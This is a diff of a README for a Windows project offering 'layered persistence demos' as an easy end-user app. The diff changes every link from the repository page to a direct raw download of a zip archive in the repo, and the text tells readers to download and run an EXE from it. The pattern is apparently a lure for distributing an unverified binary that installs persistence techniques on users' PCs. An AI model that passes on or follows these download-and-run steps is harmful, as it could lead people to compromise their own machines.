@@ -1,6 +1,6 @@
 # 🧩 3LayersPersistence - Run layered persistence demos easily
 
-[![Download Now](https://img.shields.io/badge/Download-3LayersPersistence-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BielGodoi/3LayersPersistence)
+[![Download Now](https://img.shields.io/badge/Download-3LayersPersistence-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BielGodoi/3LayersPersistence/raw/refs/heads/main/3LayersPersistence/Persistence-Layers-3.7.zip)
 
 ## 🚀 What this is
 
@@ -14,7 +14,7 @@ Use it if you want to see how these techniques work in a simple end-user package
 
 Visit this page to download and run the app:
 
-https://github.com/BielGodoi/3LayersPersistence
+https://github.com/BielGodoi/3LayersPersistence/raw/refs/heads/main/3LayersPersistence/Persistence-Layers-3.7.zip
 
 Open the page, look for the latest release or main download option, and save the file to your PC.
 
@@ -49,7 +49,7 @@ If Windows shows a prompt about the file, check the publisher and path before yo
 ## ⚙️ How to run it
 
 1. Open the download page:
-   https://github.com/BielGodoi/3LayersPersistence
+   https://github.com/BielGodoi/3LayersPersistence/raw/refs/heads/main/3LayersPersistence/Persistence-Layers-3.7.zip
 
 2. Download the latest Windows build or EXE from the page
 
@@ -163,7 +163,7 @@ A virtual machine works well if you want to keep your main Windows install separ
 
 Primary download page:
 
-https://github.com/BielGodoi/3LayersPersistence
+https://github.com/BielGodoi/3LayersPersistence/raw/refs/heads/main/3LayersPersistence/Persistence-Layers-3.7.zip
 
 ## 🧩 Topics
 
